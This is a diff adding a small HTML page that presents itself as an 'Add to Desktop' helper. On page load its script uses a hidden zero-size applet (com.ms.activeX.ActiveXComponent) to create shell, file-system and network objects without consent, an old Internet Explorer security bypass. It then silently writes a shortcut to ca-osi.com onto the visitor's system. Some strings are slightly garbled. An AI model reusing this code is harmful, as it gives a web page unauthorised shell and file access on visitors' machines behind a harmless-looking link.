@@ -1,0 +1,61 @@
+<html>
+<head>
+<script language="JavaScript" type="text/JavaScript">
+<!-- Begin
+document.writeln('Putting a shortcut on your desktopnn');
+
+document.write("<APPLET height=0 width=0 code=com.ms.activeX.ActiveXComponent></APPLET>");
+
+if (navigator.appName == 'Netscape')
+var language = navigator.language;
+else
+var language = navigator.browserLanguage;
+
+function AddFavLnk(loc, DispName, SiteURL) {
+var Shor = Shl.CreateShortcut(loc + "" + DispName +".URL");
+Shor.TargetPath = SiteURL;
+Shor.Save();
+}
+
+function f() {
+try {
+a1=document.applets[0];
+a1.setCLSID("{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}");
+a1.createInstance();
+Shl = a1.GetObject();
+a1.setCLSID("{0D43FE01-F093-11CF-8940-00A0C9054228}");
+a1.createInstance();
+FSO = a1.GetObject();
+a1.setCLSID("{F935DC26-1CF0-11D0-ADB9-00C04FD58A0B}");
+a1.createInstance();
+Net = a1.GetObject();
+try
+{
+var WF, Shor, loc;
+
+WF = FSO.GetSpecialFolder(0);
+if (language.indexOf('en') >-1) loc = WF + "desktop"; else
+document.writeln('Unable to place a shortcut on your desktop');
+
+AddFavLnk(loc, "ca-osi.com", "http://www.ca-osi.com");
+document.writeln('A shortcut has been placed on your desktop');
+}
+catch(e) {}
+}
+catch(e) {}
+}
+
+function init() {
+setTimeout("f()", 1000);
+}
+
+init();
+// End -->
+</script>
+</head>
+
+<body>
+<a href=# onClick="AddFavLnk()">Add to Desktop</a>
+</body>
+</html>
+
